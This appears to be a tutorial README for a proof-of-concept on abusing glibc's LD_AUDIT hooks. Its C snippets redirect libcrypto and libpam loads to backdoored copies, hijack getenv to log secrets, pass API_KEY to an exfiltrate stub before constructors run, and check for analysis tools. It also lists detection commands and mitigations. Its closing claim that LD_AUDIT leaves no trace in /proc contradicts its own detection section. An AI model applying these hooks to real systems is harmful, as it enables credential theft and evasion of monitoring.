# Part 9: LD_AUDIT Interface Abuse - The Ultimate Linker Hook

## Overview

The `LD_AUDIT` interface is a debugging feature in glibc's dynamic linker that provides callbacks for various linking events. It was designed for performance analysis and debugging tools like `ltrace`.

However, `LD_AUDIT` provides **more power than LD_PRELOAD**:
- Runs **before** LD_PRELOAD libraries
- Can intercept **library search paths**
- Sees **every symbol binding**
- Can **redirect any symbol** at bind time
- Gets a **pre-init callback** before any constructors

---

## How LD_AUDIT Works

### The Audit Interface

When `LD_AUDIT` is set, the dynamic linker loads the specified library and calls its audit functions:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_AUDIT CALLBACK SEQUENCE                               │
└─────────────────────────────────────────────────────────────────────────────┘

  LD_AUDIT=./audit.so ./program
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  1. la_version(version)                                                 │
  │     Negotiate API version - MUST return LAV_CURRENT                     │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  2. la_objsearch(name, cookie, flag)  [for each library search]         │
  │     Can MODIFY the library path - redirect to malicious library!        │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  3. la_objopen(map, lmid, cookie)  [for each library loaded]            │
  │     Notified of every library load - return flags for symbind           │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  4. la_symbind64(sym, ndx, ..., symname)  [for each symbol]             │
  │     Called for EVERY symbol binding - can REDIRECT any symbol!          │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  5. la_preinit(cookie)                                                  │
  │     Called BEFORE .init_array - earlier than LD_PRELOAD constructors!   │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  6. Program execution (constructors, main, etc.)                        │
  │                                                                         │
  │  la_pltenter/la_pltexit called for each PLT call (if requested)        │
  └─────────────────────────────────────────────────────────────────────────┘
              │
              ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  7. la_objclose(cookie)  [for each library unloaded]                    │
  │     Notified when libraries are unloaded                                │
  └─────────────────────────────────────────────────────────────────────────┘
```

### Required Functions

```c
/* REQUIRED - Must return LAV_CURRENT or audit is ignored */
unsigned int la_version(unsigned int version) {
    return LAV_CURRENT;  /* From <link.h> */
}

/* Optional - Called for library searches */
char *la_objsearch(const char *name, uintptr_t *cookie, unsigned int flag) {
    /* Can return different path to redirect! */
    return (char *)name;
}

/* Optional - Called when library is loaded */
unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
    /* Return LA_FLG_BINDTO | LA_FLG_BINDFROM for symbind callbacks */
    return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}

/* Optional - Called before any .init functions */
void la_preinit(uintptr_t *cookie) {
    /* Execute code before ALL constructors! */
}

/* Optional - Called for each symbol binding */
uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx,
                       uintptr_t *refcook, uintptr_t *defcook,
                       unsigned int *flags, const char *symname) {
    /* Can redirect by setting LA_SYMB_ALTVALUE and returning new address */
    return sym->st_value;
}
```

---

## Attack Technique 1: Library Path Redirection

### Hijacking Library Searches

```c
char *la_objsearch(const char *name, uintptr_t *cookie, unsigned int flag) {
    /* Redirect crypto libraries to our malicious version */
    if (strstr(name, "libcrypto")) {
        return "/tmp/evil_libcrypto.so";  /* Our backdoored version! */
    }

    if (strstr(name, "libpam")) {
        return "/tmp/evil_libpam.so";  /* Capture authentication! */
    }

    return (char *)name;  /* Other libraries unchanged */
}
```

### Attack Flow

```
Target: Program that uses libcrypto.so for encryption

1. Program starts with LD_AUDIT=./evil_audit.so
2. Linker searches for libcrypto.so
3. la_objsearch is called with "libcrypto.so.1.1"
4. We return "/tmp/evil_libcrypto.so"
5. Linker loads OUR library instead!
6. Our library:
   - Exports same symbols as real libcrypto
   - Logs all encryption keys
   - Calls real libcrypto for actual crypto
7. Program runs normally but we see all keys
```

---

## Attack Technique 2: Symbol Hijacking

### Redirecting Function Calls

The most powerful capability - redirect ANY symbol to our code:

```c
/* Our hook function */
char *hook_getenv(const char *name) {
    static char *(*real_getenv)(const char *) = NULL;
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    char *value = real_getenv(name);

    /* Log sensitive lookups */
    if (strstr(name, "KEY") || strstr(name, "SECRET")) {
        log_stolen_secret(name, value);
    }

    return value;
}

/* Redirect in la_symbind64 */
uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx,
                       uintptr_t *refcook, uintptr_t *defcook,
                       unsigned int *flags, const char *symname) {

    if (strcmp(symname, "getenv") == 0) {
        /* Tell linker we're providing alternate address */
        *flags |= LA_SYMB_ALTVALUE;
        return (uintptr_t)hook_getenv;  /* All getenv calls go here! */
    }

    return sym->st_value;
}
```

### Why This Is Powerful

```
LD_PRELOAD Limitation:
─────────────────────────────────────────────────────────────────
  To hook getenv, must:
    1. Export a function named "getenv"
    2. Hope program uses dynamic getenv (not static)
    3. Be loaded before libc

LD_AUDIT Advantage:
─────────────────────────────────────────────────────────────────
  To hook getenv:
    1. Check symname in la_symbind64
    2. Return our hook address
    3. Works for ANY symbol, even internal ones!
    4. Don't need to export the symbol name
```

---

## Attack Technique 3: Early Code Execution

### la_preinit - Before All Constructors

```c
void la_preinit(uintptr_t *cookie) {
    /* This runs BEFORE:
     *   - LD_PRELOAD library constructors
     *   - Library .init_array functions
     *   - Program .init_array functions
     *   - main()
     */

    /* Perfect for:
     *   - Stealing environment variables before sanitization
     *   - Detecting security tools
     *   - Establishing persistence
     *   - Hooking before any defenses initialize
     */

    /* Capture secrets NOW */
    char *api_key = getenv("API_KEY");
    if (api_key) {
        exfiltrate(api_key);
    }
}
```

### Execution Order Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    EXECUTION ORDER                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  1. LD_AUDIT la_version()      ← EARLIEST - Negotiation
  2. LD_AUDIT la_objsearch()    ← Library search interception
  3. LD_AUDIT la_objopen()      ← Library load notification
  4. LD_AUDIT la_symbind64()    ← Symbol binding
  5. LD_AUDIT la_preinit()      ← BEFORE ALL CONSTRUCTORS!
  ─────────────────────────────────────────────────────────────────
  6. LD_PRELOAD constructors    ← LD_PRELOAD runs here
  7. Library constructors
  8. Program constructors
  9. main()

  LD_AUDIT gets code execution BEFORE LD_PRELOAD!
```

---

## Attack Technique 4: Security Tool Detection

### Detecting Defenses

```c
unsigned int la_version(unsigned int version) {
    /* Check for security tools */

    /* Other hooking frameworks */
    if (getenv("LD_PRELOAD")) {
        log_event("LD_PRELOAD detected - potential defense/monitor");
    }

    /* Memory sanitizers */
    if (getenv("ASAN_OPTIONS") || getenv("MSAN_OPTIONS")) {
        log_event("Sanitizer detected - maybe abort");
    }

    /* Debugging */
    if (getenv("LD_DEBUG")) {
        log_event("LD_DEBUG set - being analyzed");
    }

    /* Detect ltrace (also uses LD_AUDIT) */
    char *audit = getenv("LD_AUDIT");
    if (audit && strstr(audit, "ltrace")) {
        log_event("ltrace detected");
    }

    return LAV_CURRENT;
}
```

---

## LD_AUDIT vs LD_PRELOAD

| Feature | LD_PRELOAD | LD_AUDIT |
|---------|------------|----------|
| Execution timing | After audit, before program | Before LD_PRELOAD |
| Library path interception | No | Yes (la_objsearch) |
| Symbol binding visibility | No | Yes (la_symbind64) |
| Symbol redirection | Must export symbol | Any symbol |
| Pre-constructor hook | Constructor | la_preinit (earlier) |
| PLT call tracing | No | Yes (la_pltenter/exit) |
| Complexity | Simple | More complex |
| SUID binaries | Ignored | Ignored |

### When to Use Each

```
Use LD_PRELOAD when:
  - Simple function hooking is enough
  - Quick prototyping
  - Only need to replace specific functions

Use LD_AUDIT when:
  - Need earliest possible execution
  - Want to intercept library loading
  - Need to redirect arbitrary symbols
  - Want PLT call tracing
  - Detecting other hooks (LD_PRELOAD)
```

---

## Defense Considerations

### Detection Methods

```bash
# Check for LD_AUDIT in environment
env | grep LD_AUDIT

# Check /proc for running processes
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep LD_AUDIT

# Monitor library loads
LD_DEBUG=libs ./program 2>&1 | grep audit
```

### Mitigations

1. **Sanitize environment** - Clear LD_AUDIT for sensitive operations
2. **Static linking** - Removes dynamic linking attack surface
3. **Secure execution mode** - LD_AUDIT ignored for setuid binaries
4. **Integrity monitoring** - Detect unexpected audit libraries

---

## Files in This POC

| File | Description |
|------|-------------|
| `audit_explorer.c` | Demonstrates all LD_AUDIT callbacks |
| `evil_audit.c` | Malicious audit library for attacks |
| `audit_hijack.c` | Symbol hijacking demonstration |
| `victim.c` | Target program for demonstrations |
| `Makefile` | Build and run demonstrations |

## Building and Running

```bash
# Build all components
make all

# Run full demonstration
make demo

# Individual demonstrations
make normal      # Run without LD_AUDIT
make explore     # Explore audit callbacks
make attack      # Run malicious audit
make hijack      # Symbol hijacking demo
make compare     # LD_AUDIT vs LD_PRELOAD

# Clean up
make clean
```

---

## Key Takeaways

1. **LD_AUDIT runs before LD_PRELOAD** - Earliest user-space hook point

2. **la_objsearch can redirect libraries** - Point program to malicious libraries

3. **la_symbind64 can redirect any symbol** - More powerful than LD_PRELOAD

4. **la_preinit runs before all constructors** - Code execution before any initialization

5. **Same SUID limitation as LD_PRELOAD** - Ignored for setuid binaries

6. **More complex but more powerful** - Worth the complexity for advanced attacks

7. **Hard to detect** - No obvious indicators like LD_PRELOAD in /proc
